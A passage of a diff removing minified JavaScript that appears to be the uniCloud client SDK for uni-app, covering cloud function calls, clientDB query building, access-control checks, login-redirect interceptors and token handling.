-                          a.e(c);
-                        } finally {
-                          a.f();
-                        }
-                        Kt({
-                          path: "/?download_url",
-                          data: {
-                            file_list: o
-                          },
-                          method: "POST"
-                        }, r.config).then(function (t) {
-                          var n = t.file_list,
-                            i = void 0 === n ? [] : n;
-                          e({
-                            fileList: i.map(function (e) {
-                              return {
-                                fileID: Qt.call(r, e.file_id),
-                                tempFileURL: e.download_url
-                              };
-                            })
-                          });
-                        }).catch(function (e) {
-                          return t(e);
-                        });
-                      }));
-                    case 2:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }, {
-            key: "connectWebSocket",
-            value: function () {
-              var e = (0, l.default)(o.default.mark(function e(t) {
-                var n, r;
-                return o.default.wrap(function (e) {
-                  while (1) switch (e.prev = e.next) {
-                    case 0:
-                      return n = t.name, r = t.query, e.abrupt("return", _e.connectSocket({
-                        url: this._websocket.signedURL(n, r),
-                        complete: function () {}
-                      }));
-                    case 2:
-                    case "end":
-                      return e.stop();
-                  }
-                }, e, this);
-              }));
-              return function (t) {
-                return e.apply(this, arguments);
-              };
-            }()
-          }]), e;
-        }(),
-        tn = {
-          init: function (e) {
-            e.provider = "alipay";
-            var t = new en(e);
-            return t.auth = function () {
-              return {
-                signInAnonymously: function () {
-                  return Promise.resolve();
-                },
-                getLoginState: function () {
-                  return Promise.resolve(!0);
-                }
-              };
-            }, t;
-          }
-        };
-      function nn(e) {
-        var t,
-          n = e.data;
-        t = ke();
-        var r = JSON.parse(JSON.stringify(n || {}));
-        if (Object.assign(r, {
-          clientInfo: t
-        }), !r.uniIdToken) {
-          var i = ye(),
-            o = i.token;
-          o && (r.uniIdToken = o);
-        }
-        return r;
-      }
-      var rn = [{
-          rule: /fc_function_not_found|FUNCTION_NOT_FOUND/,
-          content: "\uFF0C\u4E91\u51FD\u6570[{functionName}]\u5728\u4E91\u7AEF\u4E0D\u5B58\u5728\uFF0C\u8BF7\u68C0\u67E5\u6B64\u4E91\u51FD\u6570\u540D\u79F0\u662F\u5426\u6B63\u786E\u4EE5\u53CA\u8BE5\u4E91\u51FD\u6570\u662F\u5426\u5DF2\u4E0A\u4F20\u5230\u670D\u52A1\u7A7A\u95F4",
-          mode: "append"
-        }],
-        on = /[\\^$.*+?()[\]{}|]/g,
-        an = RegExp(on.source);
-      function sn(e, t, n) {
-        return e.replace(new RegExp((r = t) && an.test(r) ? r.replace(on, "\\$&") : r, "g"), n);
-        var r;
-      }
-      var un = {
-          NONE: "none",
-          REQUEST: "request",
-          RESPONSE: "response",
-          BOTH: "both"
-        },
-        cn = "_globalUniCloudStatus",
-        ln = "_globalUniCloudSecureNetworkCache__{spaceId}",
-        fn = "uni-secure-network",
-        dn = {
-          SYSTEM_ERROR: {
-            code: 20000,
-            message: "System error"
-          },
-          APP_INFO_INVALID: {
-            code: 20101,
-            message: "Invalid client"
-          },
-          GET_ENCRYPT_KEY_FAILED: {
-            code: 20102,
-            message: "Get encrypt key failed"
-          }
-        };
-      function hn(e) {
-        var t = e || {},
-          n = t.errSubject,
-          r = t.subject,
-          i = t.errCode,
-          o = t.errMsg,
-          a = t.code,
-          s = t.message,
-          u = t.cause;
-        return new ge({
-          subject: n || r || fn,
-          code: i || a || dn.SYSTEM_ERROR.code,
-          message: o || s,
-          cause: u
-        });
-      }
-      var pn;
-      pn = "0123456789abcdef";
-      var gn;
-      function vn() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-          t = e.secretType;
-        return t === un.REQUEST || t === un.RESPONSE || t === un.BOTH;
-      }
-      function mn() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-          t = e.name,
-          n = e.data,
-          r = void 0 === n ? {} : n;
-        return "app" === J && "DCloud-clientDB" === t && "encryption" === r.redirectTo && "getAppClientKey" === r.action;
-      }
-      function _n(e) {
-        e.functionName, e.result, e.logPvd;
-      }
-      function yn(e) {
-        var t = e.callFunction,
-          n = function (n) {
-            var r = this,
-              i = n.name;
-            n.data = nn.call(e, {
-              data: n.data
-            });
-            var o = {
-                aliyun: "aliyun",
-                tencent: "tcb",
-                tcb: "tcb",
-                alipay: "alipay",
-                dcloud: "dcloud"
-              }[this.config.provider],
-              a = vn(n),
-              s = mn(n),
-              u = a || s;
-            return t.call(this, n).then(function (e) {
-              return e.errCode = 0, !u && _n.call(r, {
-                functionName: i,
-                result: e,
-                logPvd: o
-              }), Promise.resolve(e);
-            }, function (e) {
-              return !u && _n.call(r, {
-                functionName: i,
-                result: e,
-                logPvd: o
-              }), e && e.message && (e.message = function () {
-                for (var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}, t = e.message, n = void 0 === t ? "" : t, r = e.extraInfo, i = void 0 === r ? {} : r, o = e.formatter, a = void 0 === o ? [] : o, s = 0; s < a.length; s++) {
-                  var u = a[s],
-                    c = u.rule,
-                    l = u.content,
-                    f = u.mode,
-                    d = n.match(c);
-                  if (d) {
-                    for (var h = l, p = 1; p < d.length; p++) h = sn(h, "{$".concat(p, "}"), d[p]);
-                    for (var g in i) h = sn(h, "{".concat(g, "}"), i[g]);
-                    return "replace" === f ? h : n + h;
-                  }
-                }
-                return n;
-              }({
-                message: "[".concat(n.name, "]: ").concat(e.message),
-                formatter: rn,
-                extraInfo: {
-                  functionName: i
-                }
-              })), Promise.reject(e);
-            });
-          };
-        e.callFunction = function (t) {
-          var r,
-            i,
-            o = e.config,
-            a = o.provider,
-            s = o.spaceId,
-            u = t.name;
-          return t.data = t.data || {}, r = n, r = r.bind(e), i = mn(t) ? n.call(e, t) : function (e) {
-            var t = e.name,
-              n = e.data,
-              r = void 0 === n ? {} : n;
-            return "mp-weixin" === J && "uni-id-co" === t && "secureNetworkHandshakeByWeixin" === r.method;
-          }(t) ? r.call(e, t) : vn(t) ? new gn({
-            secretType: t.secretType,
-            uniCloudIns: e
-          }).wrapEncryptDataCallFunction(n.bind(e))(t) : function () {
-            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-              t = e.provider,
-              n = e.spaceId,
-              r = e.functionName,
-              i = be(),
-              o = i.appId,
-              a = i.uniPlatform,
-              s = i.osName,
-              u = a;
-            "app" === a && (u = s);
-            var c = function () {
-              var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                t = e.provider,
-                n = e.spaceId,
-                r = Y;
-              if (!r) return {};
-              t = function (e) {
-                return "tencent" === e ? "tcb" : e;
-              }(t);
-              var i = r.find(function (e) {
-                return e.provider === t && e.spaceId === n;
-              });
-              return i && i.config;
-            }({
-              provider: t,
-              spaceId: n
-            });
-            if (!c || !c.accessControl || !c.accessControl.enable) return !1;
-            var l = c.accessControl.function || {},
-              f = Object.keys(l);
-            if (0 === f.length) return !0;
-            var d = function (e, t) {
-              for (var n, r, i, o = 0; o < e.length; o++) {
-                var a = e[o];
-                a !== t ? "*" !== a ? a.split(",").map(function (e) {
-                  return e.trim();
-                }).indexOf(t) > -1 && (r = a) : i = a : n = a;
-              }
-              return n || r || i;
-            }(f, r);
-            if (!d) return !1;
-            if ((l[d] || []).find(function () {
-              var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
-              return e.appId === o && (e.platform || "").toLowerCase() === u.toLowerCase();
-            })) return !0;
-            throw console.error("\u6B64\u5E94\u7528[appId: ".concat(o, ", platform: ").concat(u, "]\u4E0D\u5728\u4E91\u7AEF\u914D\u7F6E\u7684\u5141\u8BB8\u8BBF\u95EE\u7684\u5E94\u7528\u5217\u8868\u5185\uFF0C\u53C2\u8003\uFF1Ahttps://uniapp.dcloud.net.cn/uniCloud/secure-network.html#verify-client")), hn(dn.APP_INFO_INVALID);
-          }({
-            provider: a,
-            spaceId: s,
-            functionName: u
-          }) ? new gn({
-            secretType: t.secretType,
-            uniCloudIns: e
-          }).wrapVerifyClientCallFunction(n.bind(e))(t) : r(t), Object.defineProperty(i, "result", {
-            get: function () {
-              return console.warn("\u5F53\u524D\u8FD4\u56DE\u7ED3\u679C\u4E3APromise\u7C7B\u578B\uFF0C\u4E0D\u53EF\u76F4\u63A5\u8BBF\u95EE\u5176result\u5C5E\u6027\uFF0C\u8BE6\u60C5\u8BF7\u53C2\u8003\uFF1Ahttps://uniapp.dcloud.net.cn/uniCloud/faq?id=promise"), {};
-            }
-          }), i.then(function (e) {
-            return e;
-          });
-        };
-      }
-      gn = "mp-weixin" !== J && "app" !== J ? function () {
-        return (0, m.default)(function e() {
-          throw (0, v.default)(this, e), hn({
-            message: "Platform ".concat(J, " is not supported by secure network")
-          });
-        });
-      }() : function () {
-        return (0, m.default)(function e() {
-          throw (0, v.default)(this, e), hn({
-            message: "Platform ".concat(J, " is not enabled, please check whether secure network module is enabled in your manifest.json")
-          });
-        });
-      }();
-      var wn = Symbol("CLIENT_DB_INTERNAL");
-      function bn(e, t) {
-        return e.then = "DoNotReturnProxyWithAFunctionNamedThen", e._internalType = wn, e.inspect = null, e.__ob__ = void 0, new Proxy(e, {
-          get: function (e, n, r) {
-            if ("_uniClient" === n) return null;
-            if ("symbol" == (0, u.default)(n)) return e[n];
-            if (n in e || "string" != typeof n) {
-              var i = e[n];
-              return "function" == typeof i ? i.bind(e) : i;
-            }
-            return t.get(e, n, r);
-          }
-        });
-      }
-      function xn(e) {
-        return {
-          on: function (t, n) {
-            e[t] = e[t] || [], e[t].indexOf(n) > -1 || e[t].push(n);
-          },
-          off: function (t, n) {
-            e[t] = e[t] || [];
-            var r = e[t].indexOf(n);
-            -1 !== r && e[t].splice(r, 1);
-          }
-        };
-      }
-      var kn = ["db.Geo", "db.command", "command.aggregate"];
-      function Sn(e, t) {
-        return kn.indexOf("".concat(e, ".").concat(t)) > -1;
-      }
-      function On(e) {
-        switch (N(e)) {
-          case "array":
-            return e.map(function (e) {
-              return On(e);
-            });
-          case "object":
-            return e._internalType === wn || Object.keys(e).forEach(function (t) {
-              e[t] = On(e[t]);
-            }), e;
-          case "regexp":
-            return {
-              $regexp: {
-                source: e.source,
-                flags: e.flags
-              }
-            };
-          case "date":
-            return {
-              $date: e.toISOString()
-            };
-          default:
-            return e;
-        }
-      }
-      function Tn(e) {
-        return e && e.content && e.content.$method;
-      }
-      var Pn = function () {
-        function e(t, n, r) {
-          (0, v.default)(this, e), this.content = t, this.prevStage = n || null, this.udb = null, this._database = r;
-        }
-        return (0, m.default)(e, [{
-          key: "toJSON",
-          value: function () {
-            for (var e = this, t = [e.content]; e.prevStage;) e = e.prevStage, t.push(e.content);
-            return {
-              $db: t.reverse().map(function (e) {
-                return {
-                  $method: e.$method,
-                  $param: On(e.$param)
-                };
-              })
-            };
-          }
-        }, {
-          key: "toString",
-          value: function () {
-            return JSON.stringify(this.toJSON());
-          }
-        }, {
-          key: "getAction",
-          value: function () {
-            var e = this.toJSON().$db.find(function (e) {
-              return "action" === e.$method;
-            });
-            return e && e.$param && e.$param[0];
-          }
-        }, {
-          key: "getCommand",
-          value: function () {
-            return {
-              $db: this.toJSON().$db.filter(function (e) {
-                return "action" !== e.$method;
-              })
-            };
-          }
-        }, {
-          key: "isAggregate",
-          get: function () {
-            for (var e = this; e;) {
-              var t = Tn(e),
-                n = Tn(e.prevStage);
-              if ("aggregate" === t && "collection" === n || "pipeline" === t) return !0;
-              e = e.prevStage;
-            }
-            return !1;
-          }
-        }, {
-          key: "isCommand",
-          get: function () {
-            for (var e = this; e;) {
-              if ("command" === Tn(e)) return !0;
-              e = e.prevStage;
-            }
-            return !1;
-          }
-        }, {
-          key: "isAggregateCommand",
-          get: function () {
-            for (var e = this; e;) {
-              var t = Tn(e),
-                n = Tn(e.prevStage);
-              if ("aggregate" === t && "command" === n) return !0;
-              e = e.prevStage;
-            }
-            return !1;
-          }
-        }, {
-          key: "getNextStageFn",
-          value: function (e) {
-            var t = this;
-            return function () {
-              return An({
-                $method: e,
-                $param: On(Array.from(arguments))
-              }, t, t._database);
-            };
-          }
-        }, {
-          key: "count",
-          get: function () {
-            return this.isAggregate ? this.getNextStageFn("count") : function () {
-              return this._send("count", Array.from(arguments));
-            };
-          }
-        }, {
-          key: "remove",
-          get: function () {
-            return this.isCommand ? this.getNextStageFn("remove") : function () {
-              return this._send("remove", Array.from(arguments));
-            };
-          }
-        }, {
-          key: "get",
-          value: function () {
-            return this._send("get", Array.from(arguments));
-          }
-        }, {
-          key: "add",
-          get: function () {
-            return this.isCommand ? this.getNextStageFn("add") : function () {
-              return this._send("add", Array.from(arguments));
-            };
-          }
-        }, {
-          key: "update",
-          value: function () {
-            return this._send("update", Array.from(arguments));
-          }
-        }, {
-          key: "end",
-          value: function () {
-            return this._send("end", Array.from(arguments));
-          }
-        }, {
-          key: "set",
-          get: function () {
-            return this.isCommand ? this.getNextStageFn("set") : function () {
-              throw new Error("JQL\u7981\u6B62\u4F7F\u7528set\u65B9\u6CD5");
-            };
-          }
-        }, {
-          key: "_send",
-          value: function (e, t) {
-            var n = this.getAction(),
-              r = this.getCommand();
-            return r.$db.push({
-              $method: e,
-              $param: On(t)
-            }), this._database._callCloudFunction({
-              action: n,
-              command: r
-            });
-          }
-        }]), e;
-      }();
-      function An(e, t, n) {
-        return bn(new Pn(e, t, n), {
-          get: function (e, t) {
-            var r = "db";
-            return e && e.content && (r = e.content.$method), Sn(r, t) ? An({
-              $method: t
-            }, e, n) : function () {
-              return An({
-                $method: t,
-                $param: On(Array.from(arguments))
-              }, e, n);
-            };
-          }
-        });
-      }
-      function In(e) {
-        var t = e.path,
-          n = e.method;
-        return function () {
-          function e() {
-            (0, v.default)(this, e), this.param = Array.from(arguments);
-          }
-          return (0, m.default)(e, [{
-            key: "toJSON",
-            value: function () {
-              return {
-                $newDb: [].concat((0, c.default)(t.map(function (e) {
-                  return {
-                    $method: e
-                  };
-                })), [{
-                  $method: n,
-                  $param: this.param
-                }])
-              };
-            }
-          }, {
-            key: "toString",
-            value: function () {
-              return JSON.stringify(this.toJSON());
-            }
-          }]), e;
-        }();
-      }
-      var Cn = function () {
-        function e() {
-          var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-            n = t.uniClient,
-            r = void 0 === n ? {} : n,
-            i = t.isJQL,
-            o = void 0 !== i && i;
-          (0, v.default)(this, e), this._uniClient = r, this._authCallBacks = {}, this._dbCallBacks = {}, r._isDefault && (this._dbCallBacks = K("_globalUniCloudDatabaseCallback")), o || (this.auth = xn(this._authCallBacks)), this._isJQL = o, Object.assign(this, xn(this._dbCallBacks)), this.env = bn({}, {
-            get: function (e, t) {
-              return {
-                $env: t
-              };
-            }
-          }), this.Geo = bn({}, {
-            get: function (e, t) {
-              return In({
-                path: ["Geo"],
-                method: t
-              });
-            }
-          }), this.serverDate = In({
-            path: [],
-            method: "serverDate"
-          }), this.RegExp = In({
-            path: [],
-            method: "RegExp"
-          });
-        }
-        return (0, m.default)(e, [{
-          key: "getCloudEnv",
-          value: function (e) {
-            if ("string" != typeof e || !e.trim()) throw new Error("getCloudEnv\u53C2\u6570\u9519\u8BEF");
-            return {
-              $env: e.replace("$cloudEnv_", "")
-            };
-          }
-        }, {
-          key: "_callback",
-          value: function (e, t) {
-            var n = this._dbCallBacks;
-            n[e] && n[e].forEach(function (e) {
-              e.apply(void 0, (0, c.default)(t));
-            });
-          }
-        }, {
-          key: "_callbackAuth",
-          value: function (e, t) {
-            var n = this._authCallBacks;
-            n[e] && n[e].forEach(function (e) {
-              e.apply(void 0, (0, c.default)(t));
-            });
-          }
-        }, {
-          key: "multiSend",
-          value: function () {
-            var e = Array.from(arguments),
-              t = e.map(function (e) {
-                var t = e.getAction(),
-                  n = e.getCommand();
-                if ("getTemp" !== n.$db[n.$db.length - 1].$method) throw new Error("multiSend\u53EA\u652F\u6301\u5B50\u547D\u4EE4\u5185\u4F7F\u7528getTemp");
-                return {
-                  action: t,
-                  command: n
-                };
-              });
-            return this._callCloudFunction({
-              multiCommand: t,
-              queryList: e
-            });
-          }
-        }]), e;
-      }();
-      function En(e) {
-        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
-        return bn(new e(t), {
-          get: function (e, t) {
-            return Sn("db", t) ? An({
-              $method: t
-            }, null, e) : function () {
-              return An({
-                $method: t,
-                $param: On(Array.from(arguments))
-              }, null, e);
-            };
-          }
-        });
-      }
-      var Ln = function (e) {
-          (0, d.default)(n, e);
-          var t = k(n);
-          function n() {
-            return (0, v.default)(this, n), t.apply(this, arguments);
-          }
-          return (0, m.default)(n, [{
-            key: "_parseResult",
-            value: function (e) {
-              return this._isJQL ? e.result : e;
-            }
-          }, {
-            key: "_callCloudFunction",
-            value: function (e) {
-              var t = this,
-                n = e.action,
-                r = e.command,
-                i = e.multiCommand,
-                o = e.queryList;
-              function a(e, t) {
-                if (i && o) for (var n = 0; n < o.length; n++) {
-                  var r = o[n];
-                  r.udb && "function" == typeof r.udb.setResult && (t ? r.udb.setResult(t) : r.udb.setResult(e.result.dataList[n]));
-                }
-              }
-              var s = this,
-                u = this._isJQL ? "databaseForJQL" : "database";
-              function c(e) {
-                return s._callback("error", [e]), te(ne(u, "fail"), e).then(function () {
-                  return te(ne(u, "complete"), e);
-                }).then(function () {
-                  return a(null, e), le(oe.RESPONSE, {
-                    type: ae.CLIENT_DB,
-                    content: e
-                  }), Promise.reject(e);
-                });
-              }
-              var l = te(ne(u, "invoke")),
-                f = this._uniClient;
-              return l.then(function () {
-                return f.callFunction({
-                  name: "DCloud-clientDB",
-                  type: L.CLIENT_DB,
-                  data: {
-                    action: n,
-                    command: r,
-                    multiCommand: i
-                  }
-                });
-              }).then(function (e) {
-                var n = e.result,
-                  r = n.code,
-                  i = n.message,
-                  o = n.token,
-                  l = n.tokenExpired,
-                  f = n.systemInfo,
-                  d = void 0 === f ? [] : f;
-                if (d) for (var h = 0; h < d.length; h++) {
-                  var p = d[h],
-                    g = p.level,
-                    v = p.message,
-                    m = p.detail,
-                    _ = "[System Info]" + v;
-                  m && (_ = "".concat(_, "\n\u8BE6\u7EC6\u4FE1\u606F\uFF1A").concat(m)), (console["app" === J && "warn" === g ? "error" : g] || console.log)(_);
-                }
-                if (r) return c(new ge({
-                  code: r,
-                  message: i,
-                  requestId: e.requestId
-                }));
-                e.result.errCode = e.result.errCode || e.result.code, e.result.errMsg = e.result.errMsg || e.result.message, o && l && (we({
-                  token: o,
-                  tokenExpired: l
-                }), t._callbackAuth("refreshToken", [{
-                  token: o,
-                  tokenExpired: l
-                }]), t._callback("refreshToken", [{
-                  token: o,
-                  tokenExpired: l
-                }]), le(oe.REFRESH_TOKEN, {
-                  token: o,
-                  tokenExpired: l
-                }));
-                for (var y = [{
-                    prop: "affectedDocs",
-                    tips: "affectedDocs\u4E0D\u518D\u63A8\u8350\u4F7F\u7528\uFF0C\u8BF7\u4F7F\u7528inserted/deleted/updated/data.length\u66FF\u4EE3"
-                  }, {
-                    prop: "code",
-                    tips: "code\u4E0D\u518D\u63A8\u8350\u4F7F\u7528\uFF0C\u8BF7\u4F7F\u7528errCode\u66FF\u4EE3"
-                  }, {
-                    prop: "message",
-                    tips: "message\u4E0D\u518D\u63A8\u8350\u4F7F\u7528\uFF0C\u8BF7\u4F7F\u7528errMsg\u66FF\u4EE3"
-                  }], w = function (t) {
-                    var n = y[t],
-                      r = n.prop,
-                      i = n.tips;
-                    if (r in e.result) {
-                      var o = e.result[r];
-                      Object.defineProperty(e.result, r, {
-                        get: function () {
-                          return console.warn(i), o;
-                        }
-                      });
-                    }
-                  }, b = 0; b < y.length; b++) w(b);
-                return function (e) {
-                  return te(ne(u, "success"), e).then(function () {
-                    return te(ne(u, "complete"), e);
-                  }).then(function () {
-                    a(e, null);
-                    var t = s._parseResult(e);
-                    return le(oe.RESPONSE, {
-                      type: ae.CLIENT_DB,
-                      content: t
-                    }), Promise.resolve(t);
-                  });
-                }(e);
-              }, function (e) {
-                return /fc_function_not_found|FUNCTION_NOT_FOUND/g.test(e.message) && console.warn("clientDB\u672A\u521D\u59CB\u5316\uFF0C\u8BF7\u5728web\u63A7\u5236\u53F0\u4FDD\u5B58\u4E00\u6B21schema\u4EE5\u5F00\u542FclientDB"), c(new ge({
-                  code: e.code || "SYSTEM_ERROR",
-                  message: e.message,
-                  requestId: e.requestId
-                }));
-              });
-            }
-          }]), n;
-        }(Cn),
-        Mn = "token\u65E0\u6548\uFF0C\u8DF3\u8F6C\u767B\u5F55\u9875\u9762",
-        Dn = "token\u8FC7\u671F\uFF0C\u8DF3\u8F6C\u767B\u5F55\u9875\u9762",
-        jn = {
-          TOKEN_INVALID_TOKEN_EXPIRED: Dn,
-          TOKEN_INVALID_INVALID_CLIENTID: Mn,
-          TOKEN_INVALID: Mn,
-          TOKEN_INVALID_WRONG_TOKEN: Mn,
-          TOKEN_INVALID_ANONYMOUS_USER: Mn
-        },
-        Nn = {
-          "uni-id-token-expired": Dn,
-          "uni-id-check-token-failed": Mn,
-          "uni-id-token-not-exist": Mn,
-          "uni-id-check-device-feature-failed": Mn
-        },
-        Rn = x(x(x({}, jn), Nn), {}, {
-          default: "\u7528\u6237\u672A\u767B\u5F55\u6216\u767B\u5F55\u72B6\u6001\u8FC7\u671F\uFF0C\u81EA\u52A8\u8DF3\u8F6C\u767B\u5F55\u9875\u9762"
-        });
-      function $n(e, t) {
-        var n = "";
-        return n = e ? "".concat(e, "/").concat(t) : t, n.replace(/^\//, "");
-      }
-      function Fn() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [],
-          t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "",
-          n = [],
-          r = [];
-        return e.forEach(function (e) {
-          !0 === e.needLogin ? n.push($n(t, e.path)) : !1 === e.needLogin && r.push($n(t, e.path));
-        }), {
-          needLoginPage: n,
-          notNeedLoginPage: r
-        };
-      }
-      function Un(e) {
-        return e.split("?")[0].replace(/^\//, "");
-      }
-      function Bn() {
-        return function (e) {
-          var t = e && e.$page && e.$page.fullPath;
-          return t ? ("/" !== t.charAt(0) && (t = "/" + t), t) : "";
-        }(function () {
-          var e = getCurrentPages();
-          return e[e.length - 1];
-        }());
-      }
-      function qn() {
-        return Un(Bn());
-      }
-      function zn() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
-          t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
-        if (!e) return !1;
-        if (!(t && t.list && t.list.length)) return !1;
-        var n = t.list,
-          r = Un(e);
-        return n.some(function (e) {
-          return e.pagePath === r;
-        });
-      }
-      var Hn,
-        Yn = !!_.default.uniIdRouter,
-        Jn = function () {
-          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : _.default,
-            t = e.pages,
-            n = void 0 === t ? [] : t,
-            r = e.subPackages,
-            i = void 0 === r ? [] : r,
-            o = e.uniIdRouter,
-            a = void 0 === o ? {} : o,
-            s = e.tabBar,
-            u = void 0 === s ? {} : s,
-            l = a.loginPage,
-            f = a.needLogin,
-            d = void 0 === f ? [] : f,
-            h = a.resToLogin,
-            p = void 0 === h || h,
-            g = Fn(n),
-            v = g.needLoginPage,
-            m = g.notNeedLoginPage,
-            y = function () {
-              var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [],
-                t = [],
-                n = [];
-              return e.forEach(function (e) {
-                var r = e.root,
-                  i = e.pages,
-                  o = void 0 === i ? [] : i,
-                  a = Fn(o, r),
-                  s = a.needLoginPage,
-                  u = a.notNeedLoginPage;
-                t.push.apply(t, (0, c.default)(s)), n.push.apply(n, (0, c.default)(u));
-              }), {
-                needLoginPage: t,
-                notNeedLoginPage: n
-              };
-            }(i),
-            w = y.needLoginPage,
-            b = y.notNeedLoginPage;
-          return {
-            loginPage: l,
-            routerNeedLogin: d,
-            resToLogin: p,
-            needLoginPage: [].concat((0, c.default)(v), (0, c.default)(w)),
-            notNeedLoginPage: [].concat((0, c.default)(m), (0, c.default)(b)),
-            loginPageInTabBar: zn(l, u)
-          };
-        }(),
-        Vn = Jn.loginPage,
-        Zn = Jn.routerNeedLogin,
-        Wn = Jn.resToLogin,
-        Kn = Jn.needLoginPage,
-        Gn = Jn.notNeedLoginPage,
-        Qn = Jn.loginPageInTabBar;
-      if (Kn.indexOf(Vn) > -1) throw new Error("Login page [".concat(Vn, "] should not be \"needLogin\", please check your pages.json"));
-      function Xn(e) {
-        var t = qn();
-        if ("/" === e.charAt(0)) return e;
-        var n = e.split("?"),
-          r = (0, s.default)(n, 2),
-          i = r[0],
-          o = r[1],
-          a = i.replace(/^\//, "").split("/"),
-          u = t.split("/");
-        u.pop();
-        for (var c = 0; c < a.length; c++) {
-          var l = a[c];
-          ".." === l ? u.pop() : "." !== l && u.push(l);
-        }
-        return "" === u[0] && u.shift(), "/" + u.join("/") + (o ? "?" + o : "");
-      }
-      function er(e) {
-        var t = Un(Xn(e));
-        return !(Gn.indexOf(t) > -1) && (Kn.indexOf(t) > -1 || Zn.some(function (t) {
-          return function (e, t) {
-            return new RegExp(t).test(e);
-          }(e, t);
-        }));
-      }
-      function tr(e) {
-        var t = e.redirect,
-          n = Un(t),
-          r = Un(Vn);
-        return qn() !== r && n !== r;
-      }
-      function nr() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-          t = e.api,
-          n = e.redirect;
-        if (n && tr({
-          redirect: n
-        })) {
-          var r = function (e, t) {
-            return "/" !== e.charAt(0) && (e = "/" + e), t ? e.indexOf("?") > -1 ? e + "&uniIdRedirectUrl=".concat(encodeURIComponent(t)) : e + "?uniIdRedirectUrl=".concat(encodeURIComponent(t)) : e;
-          }(Vn, n);
-          Qn ? "navigateTo" !== t && "redirectTo" !== t || (t = "switchTab") : "switchTab" === t && (t = "navigateTo");
-          var i = {
-            navigateTo: uni.navigateTo,
-            redirectTo: uni.redirectTo,
-            switchTab: uni.switchTab,
-            reLaunch: uni.reLaunch
-          };
-          setTimeout(function () {
-            i[t]({
-              url: r
-            });
-          }, 0);
-        }
-      }
-      function rr() {
-        var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-          t = e.url,
-          n = {
-            abortLoginPageJump: !1,
-            autoToLoginPage: !1
-          },
-          r = function () {
-            var e,
-              t = ye(),
-              n = t.token,
-              r = t.tokenExpired;
-            if (n) {
-              if (r < Date.now()) {
-                var i = "uni-id-token-expired";
-                e = {
-                  errCode: i,
-                  errMsg: Rn[i]
-                };
-              }
-            } else {
-              var o = "uni-id-check-token-failed";
-              e = {
-                errCode: o,
-                errMsg: Rn[o]
-              };
-            }
-            return e;
-          }();
-        if (er(t) && r) {
-          if (r.uniIdRedirectUrl = t, se(oe.NEED_LOGIN).length > 0) return setTimeout(function () {
-            le(oe.NEED_LOGIN, r);
-          }, 0), n.abortLoginPageJump = !0, n;
-          n.autoToLoginPage = !0;
-        }
-        return n;
-      }
-      function ir() {
-        !function () {
-          var e = Bn(),
-            t = rr({
-              url: e
-            }),
-            n = t.abortLoginPageJump,
-            r = t.autoToLoginPage;
-          n || r && nr({
-            api: "redirectTo",
-            redirect: e
-          });
-        }();
-        for (var e = ["navigateTo", "redirectTo", "reLaunch", "switchTab"], t = function (t) {
-            var n = e[t];
-            uni.addInterceptor(n, {
-              invoke: function (e) {
-                var t = rr({
-                    url: e.url
-                  }),
-                  r = t.abortLoginPageJump,
-                  i = t.autoToLoginPage;
-                return r ? e : i ? (nr({
-                  api: n,
-                  redirect: Xn(e.url)
-                }), !1) : e;
-              }
-            });
-          }, n = 0; n < e.length; n++) t(n);
-      }
-      function or() {
-        this.onResponse(function (e) {
-          var t = e.type,
-            n = e.content,
-            r = !1;
-          switch (t) {
-            case "cloudobject":
-              r = function (e) {
-                if ("object" != (0, u.default)(e)) return !1;
-                var t = e || {},
-                  n = t.errCode;
-                return n in Rn;
-              }(n);
-              break;
-            case "clientdb":
-              r = function (e) {
-                if ("object" != (0, u.default)(e)) return !1;
-                var t = e || {},
-                  n = t.errCode;
-                return n in jn;
-              }(n);
-          }
-          r && function () {
-            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-              t = se(oe.NEED_LOGIN);
-            he().then(function () {
-              var n = Bn();
-              if (n && tr({
-                redirect: n
-              })) return t.length > 0 ? le(oe.NEED_LOGIN, Object.assign({
-                uniIdRedirectUrl: n
-              }, e)) : void (Vn && nr({
-                api: "navigateTo",
-                redirect: n
-              }));
-            });
-          }(n);
-        });
-      }
-      function ar(e) {
-        !function (e) {
-          e.onResponse = function (e) {
-            ue(oe.RESPONSE, e);
-          }, e.offResponse = function (e) {
-            ce(oe.RESPONSE, e);
-          };
-        }(e), function (e) {
-          e.onNeedLogin = function (e) {
-            ue(oe.NEED_LOGIN, e);
-          }, e.offNeedLogin = function (e) {
-            ce(oe.NEED_LOGIN, e);
-          }, Yn && (K(cn).needLoginInit || (K(cn).needLoginInit = !0, he().then(function () {
-            ir.call(e);
-          }), Wn && or.call(e)));
-        }(e), function (e) {
-          e.onRefreshToken = function (e) {
-            ue(oe.REFRESH_TOKEN, e);
-          }, e.offRefreshToken = function (e) {
-            ce(oe.REFRESH_TOKEN, e);
-          };
-        }(e);
-      }
-      var sr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
-        ur = /^(?:[A-Za-z\d+/]{4})*?(?:[A-Za-z\d+/]{2}(?:==)?|[A-Za-z\d+/]{3}=?)?$/;
-      function cr() {
-        var e,
-          t,
-          n = ye().token || "",
-          r = n.split(".");
-        if (!n || 3 !== r.length) return {
-          uid: null,
-          role: [],
-          permission: [],
-          tokenExpired: 0
-        };
-        try {
-          e = JSON.parse((t = r[1], decodeURIComponent(Hn(t).split("").map(function (e) {
